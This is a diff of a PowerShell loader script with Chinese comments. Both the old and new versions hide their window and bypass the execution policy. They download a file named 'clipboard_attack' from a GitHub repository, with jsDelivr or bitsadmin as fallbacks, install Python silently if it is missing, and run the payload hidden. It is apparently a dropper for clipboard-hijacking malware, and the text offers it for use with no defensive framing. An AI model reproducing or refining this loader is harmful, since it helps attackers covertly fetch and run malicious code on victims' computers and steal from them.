@@ -1,110 +1,76 @@
-# 强制使用隐藏窗口模式（通过COM对象）
-$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
-[System.Windows.Forms.Application]::EnableVisualStyles()
+# 让 PowerShell 静默运行
+$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+Start-Process -WindowStyle Hidden -FilePath $powershellPath -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File $PSCommandPath" -PassThru
+exit
 
-# 隐藏主窗口代码（需要保存为ANSI编码）
-$signature = @'
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-[DllImport("kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-'@
+# 设置执行策略为 ByPass
+Set-ExecutionPolicy Bypass -Scope Process -Force
 
-$type = Add-Type -MemberDefinition $signature -Name WindowAPI -PassThru
-$hwnd = $type::GetConsoleWindow()
-$type::ShowWindow($hwnd, 0) | Out-Null
+# 定义脚本下载链接和临时文件路径
+$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/refs/heads/main/clipboard_attack.ps1"  # 替换为目标脚本的 URL
+$scriptPath = Join-Path $env:TEMP "clipboard_attack.ps1"  # 临时文件路径
+$pythonInstallerPath = Join-Path $env:TEMP "python_installer.exe"  # Python 安装程序路径
 
-# 设置临时目录
-$tempDir = $env:TEMP
-$scriptName = "clipboard_attack.py"
-$scriptPath = Join-Path $tempDir $scriptName
-
-# 配置下载源（替换为你的真实URL）
-$downloadUrls = @(
-    "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/$scriptName",
-    "https://cdn.jsdelivr.net/gh/ethxiaoli/clipboard-setup/$scriptName"
+# 检查 Python 是否已安装
+$pythonInstalled = $false
+$pythonPaths = @(
+    "C:\Python37\python.exe",
+    "C:\Python39\python.exe",
+    "$env:LocalAppData\Programs\Python\Python37\python.exe",
+    "$env:LocalAppData\Programs\Python\Python39\python.exe"
 )
 
-# 自动选择最佳下载方式
-function Download-File {
-    param($url, $path)
+foreach ($path in $pythonPaths) {
+    if (Test-Path $path) {
+        $pythonInstalled = $true
+        $pythonPath = $path
+        break
+    }
+}
+
+# 如果 Python 没有安装，则下载安装
+if (-not $pythonInstalled) {
     try {
-        (New-Object Net.WebClient).DownloadFile($url, $path)
-        return $true
-    }
-    catch {
-        try {
-            Start-BitsTransfer -Source $url -Destination $path -ErrorAction Stop
-            return $true
+        # 下载 Python 安装程序
+        $pythonInstaller = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"  # 选择合适的 Python 安装版本
+        
+        Write-Host "正在下载 Python 安装程序..."
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest -Uri $pythonInstaller -OutFile $pythonInstallerPath
+
+        if (Test-Path $pythonInstallerPath) {
+            Write-Host "正在安装 Python..."
+            $arguments = "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1"
+            Start-Process -FilePath $pythonInstallerPath -ArgumentList $arguments -Wait -NoNewWindow
+            
+            # 等待安装完成
+            Start-Sleep -Seconds 30
+            
+            # 刷新环境变量
+            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
         }
-        catch {
-            return $false
-        }
+    } catch {
+        Write-Host "Python 安装失败: $_"
+        exit 1
     }
 }
 
-# 静默安装Python函数
-function Install-PythonSilently {
-    $pythonURL = "https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe"
-    $installerPath = Join-Path $tempDir "python_installer.exe"
-    
-    if (Download-File $pythonURL $installerPath) {
-        $installArgs = @(
-            "/quiet", 
-            "InstallAllUsers=0", 
-            "PrependPath=1", 
-            "Include_test=0", 
-            "Include_launcher=0",
-            "SimpleInstall=1"
-        )
-        $process = Start-Process $installerPath -ArgumentList $installArgs -PassThru -Wait
-        # 更新环境变量
-        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + 
-                    [System.Environment]::GetEnvironmentVariable("Path", "User")
-    }
-}
-
-# 主执行流程
+# 下载目标脚本
 try {
-    # 下载目标脚本
-    $downloadSuccess = $false
-    foreach ($url in $downloadUrls) {
-        if (Download-File $url $scriptPath) {
-            $downloadSuccess = $true
-            break
-        }
-    }
-
-    if (-not $downloadSuccess) {
-        throw "所有下载源均不可用"
-    }
-
-    # 检测Python环境
-    $pythonExe = (Get-Command python -ErrorAction SilentlyContinue).Path
-    if (-not $pythonExe) {
-        $pythonExe = (Get-Command python3 -ErrorAction SilentlyContinue).Path
-    }
-
-    if (-not $pythonExe) {
-        Install-PythonSilently
-        $pythonExe = (Get-Command python -ErrorAction SilentlyContinue).Path
-        if (-not $pythonExe) {
-            throw "Python安装失败"
-        }
-    }
-
-    # 执行Python脚本
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $pythonExe
-    $psi.Arguments = "-E `"$scriptPath`""
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute = $false
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
-
-    # 清理安装包
-    Remove-Item (Join-Path $tempDir "python_installer.exe") -ErrorAction SilentlyContinue
+    Write-Host "正在下载目标脚本..."
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
+} catch {
+    Write-Host "使用备用下载方法..."
+    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer","DownloadScript",$scriptUrl,$scriptPath -Wait
 }
-catch {
-    # 错误处理（静默记录到临时文件）
-    $_ | Out-File (Join-Path $tempDir "error.log") -Append
+
+# 运行 PowerShell 脚本
+if (Test-Path $scriptPath) {
+    Write-Host "正在启动脚本..."
+    Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath"
+} else {
+    Write-Host "脚本下载失败"
+    exit 1
 }
+
